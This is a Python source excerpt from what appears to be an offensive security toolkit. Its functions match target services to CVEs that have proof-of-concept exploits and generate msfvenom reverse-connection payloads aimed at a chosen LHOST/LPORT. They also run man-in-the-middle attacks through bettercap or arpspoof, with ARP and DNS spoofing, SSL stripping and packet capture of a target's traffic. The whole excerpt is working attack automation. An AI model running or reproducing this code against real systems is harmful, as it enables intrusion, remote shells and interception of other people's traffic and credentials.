def query_cve_database(cve_db: Dict[str, CVEEntry], service_info: str, platform: str) -> List[CVEEntry]:
    matches = []
    service_lower = service_info.lower()
    for cve in cve_db.values():
        if platform.lower() not in [p.lower() for p in cve.platforms]:
            continue
        if not cve.has_poc:
            continue
        for product in cve.affected_products:
            if product.lower() in service_lower or any(v in service_lower for v in re.findall(r'\d+\.\d+', service_lower)):
                matches.append(cve)
                break
    return sorted(matches, key=lambda x: x.reliability_score, reverse=True)

def generate_msf_payload(cve_id: str, lhost: str, lport: int, output_dir: str = "./payloads", format_type: str = "exe", dry_run: bool = False, cve_db: Optional[Dict[str, CVEEntry]] = None) -> Optional[Path]:
    if cve_db is None:
        cve_db = init_cve_database()
    if cve_id not in cve_db:
        logger.error(f"CVE '{cve_id}' not in database.")
        return None
    mapping = cve_db[cve_id]
    if not validate_lhost(lhost):
        return None
    out_path = Path(output_dir) / f"{cve_id.replace('-','_')}_lhost{lhost.replace('.','_')}_lport{lport}.{format_type}"
    out_path.parent.mkdir(parents=True, exist_ok=True)
    cmd = ["msfvenom", "-p", mapping.recommended_payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", format_type, "-o", str(out_path), "--smallest", "--platform", mapping.platforms[0], "-a", mapping.architectures[0]]
    if dry_run:
        logger.info(f"[DRY RUN] Would execute: {' '.join(cmd)}")
        return out_path
    logger.info(f"Generating payload for {cve_id} -> {out_path.name}")
    res = run_cmd(cmd, timeout=120)
    if res is None or not out_path.exists():
        logger.error("Payload generation failed.")
        return None
    sha256 = hashlib.sha256(out_path.read_bytes()).hexdigest()
    logger.info(f"Payload generated: {out_path}")
    logger.info(f"SHA-256: {sha256}")
    return out_path

def start_mitm_session(config: MITMConfig, dry_run: bool = False) -> bool:
    if not verify_tool("bettercap"):
        logger.warning("bettercap not found, using fallback ARP spoofing")
        return start_arp_spoof_fallback(config, dry_run)
    cmd = ["bettercap", "-iface", config.interface, "-eval"]
    bettercap_cmds = []
    if config.spoof_arp:
        bettercap_cmds.append(f"set arp.spoof.targets {config.target_ip}")
        bettercap_cmds.append("arp.spoof on")
    if config.spoof_dns:
        bettercap_cmds.append("set dns.spoof.hosts /etc/hosts")
        bettercap_cmds.append("dns.spoof on")
    if config.ssl_strip:
        bettercap_cmds.append("http.proxy on")
        bettercap_cmds.append("http.proxy.sslstrip on")
    if config.packet_capture:
        pcap_file = OUTPUT_DIR / f"mitm_capture_{int(time.time())}.pcap"
        bettercap_cmds.append(f"set net.sniff.log {pcap_file}")
        bettercap_cmds.append("net.sniff on")
    bettercap_cmds.append(f"sleep {config.duration}")
    bettercap_cmds.append("exit")
    cmd.append("; ".join(bettercap_cmds))
    if dry_run:
        logger.info(f"[DRY RUN] Would execute: {' '.join(cmd)}")
        return True
    logger.info(f"Starting MITM session targeting {config.target_ip} via {config.interface}")
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    proc_mgr.add(proc)
    time.sleep(2)
    if proc.poll() is not None:
        logger.error("MITM session failed to start")
        return False
    logger.info(f"MITM session active for {config.duration}s")
    return True

def start_arp_spoof_fallback(config: MITMConfig, dry_run: bool = False) -> bool:
    if not verify_tool("arpspoof"):
        logger.error("arpspoof not found and bettercap unavailable")
        return False
    if dry_run:
        logger.info(f"[DRY RUN] Would enable IP forwarding and start ARP spoofing")
        return True
    run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=10)
    cmd1 = ["arpspoof", "-i", config.interface, "-t", config.target_ip, config.gateway_ip]
    cmd2 = ["arpspoof", "-i", config.interface, "-t", config.gateway_ip, config.target_ip]
    proc1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    proc2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    proc_mgr.add(proc1)
    proc_mgr.add(proc2)
    logger.info(f"ARP spoofing active targeting {config.target_ip}")
    if config.packet_capture:
        pcap_file = OUTPUT_DIR / f"mitm_capture_{int(time.time())}.pcap"
        tcpdump_cmd = ["tcpdump", "-i", config.interface, "-w", str(pcap_file), "host", config.target_ip]
        proc3 = subprocess.Popen(tcpdump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        proc_mgr.add(proc3)
    time.sleep(config.duration)
    return True

def export_results(data: Any, filename: str, format_type: str = "json") -> Path:
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    output_path = OUTPUT_DIR / f"{filename}.{format_type}"
    if format_type == "json":
        with open(output_path, 'w') as f:
            json.dump(data, f, indent=2, default=str)
    elif format_type == "csv":
        if isinstance(data, list) and data:
            with open(output_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=data[0].keys())
                writer.writeheader()
                writer.writerows(data)
    logger.info(f"Results exported to {output_path}")
    return output_path

